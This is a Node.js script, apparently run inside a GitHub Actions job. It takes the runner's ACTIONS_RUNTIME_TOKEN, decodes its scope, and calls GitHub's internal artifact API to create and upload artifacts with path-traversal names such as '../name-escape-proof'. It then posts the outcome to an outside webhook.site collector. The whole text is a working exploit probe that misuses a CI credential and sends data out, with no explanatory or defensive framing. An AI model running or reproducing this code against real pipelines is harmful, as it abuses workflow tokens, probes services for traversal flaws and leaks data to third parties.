const { execSync } = require('child_process');
const fs = require('fs');

const SINK = 'https://webhook.site/478eb9df-c7c4-423e-9945-de4975de8fef';

execSync("python3 -c \"import zipfile; z=zipfile.ZipFile('ev.zip','w'); z.writestr('inner.txt','NAME-ESCAPE-CONTENT'); z.close()\"", { stdio: 'inherit' });
const zipBytes = fs.readFileSync('ev.zip');

const tok = process.env.ACTIONS_RUNTIME_TOKEN || '';
const scp = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString()).scp;
const pair = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
const [run, job] = [pair[1], pair[2]];
const base = (process.env.ACTIONS_RESULTS_URL || 'https://results-receiver.actions.githubusercontent.com/').replace(/\/$/, '') + '/twirp/github.actions.results.api.v1.ArtifactService/';

const call = async (m, b) =>
  (await fetch(base + m, {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json' },
    body: JSON.stringify(b)
  })).json();

async function tryName(name) {
  const cr = await call('CreateArtifact', { workflowRunBackendId: run, workflowJobRunBackendId: job, name: name, version: 1 });
  if (!cr || !cr.signedUploadUrl) return { name, create: JSON.stringify(cr).slice(0, 200) };
  const http = execSync('curl -s -o /dev/null -w "%{http_code}" -X PUT "' + cr.signedUploadUrl + '" -H "x-ms-blob-type: BlockBlob" --data-binary @ev.zip').toString();
  const fin = await call('FinalizeArtifact', { workflowRunBackendId: run, workflowJobRunBackendId: job, name: name, size: String(zipBytes.length) });
  return { name, create: 'ok', put: http, finalize: JSON.stringify(fin).slice(0, 200) };
}

(async () => {
  const results = [];
  results.push(await tryName('../name-escape-proof'));
  results.push(await tryName('sub/../../name-escape-2'));
  results.push(await tryName('plain-name-marker'));
  fetch(SINK + '?src=nameesc', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(results, null, 1) }).then(r => console.log('[posted', r.status + ']'));
  console.log('done');
})();
